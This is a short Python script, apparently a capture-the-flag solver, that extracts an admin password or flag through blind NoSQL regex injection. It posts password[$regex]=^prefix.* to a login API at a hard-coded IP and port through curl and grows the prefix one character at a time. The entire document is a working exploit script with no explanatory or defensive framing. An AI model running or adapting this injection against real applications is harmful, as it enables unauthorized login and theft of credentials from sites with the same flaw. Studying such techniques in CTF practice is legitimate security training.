#!/usr/bin/env python
import os
import string
import json

workString = ''
ip = '188.166.145.178'
port = 31336
Solved = False

allowed = list(string.ascii_letters + string.digits + '!_-@{}')

while Solved != True:
    for currentChar in allowed:
        testString = workString+currentChar
        command = f"curl -s -k -X 'POST' -H 'Host: {ip}:{port}' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'Accept: */*' -H 'Origin: http://{ip}:{port}' -H 'Referer: http://{ip}:{port}/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: close' --data-binary 'username=admin&password[%24regex]=%5E{testString}.*' http://{ip}:{port}/api/login"
        output = os.popen(command).read()
        jsonData = json.loads(output)
        print( f"[{'+' if jsonData['logged'] == 1 else '-'}] Trying: '{workString}' + '{currentChar}' ({testString}) | isCorrect: {'True' if jsonData['logged'] == 1 else 'False'}")
        if jsonData["logged"] == 1:
            workString+=currentChar
            if currentChar == '}': Solved = True
            break

print("")
print(f"[FLAG] The flag is: {workString}")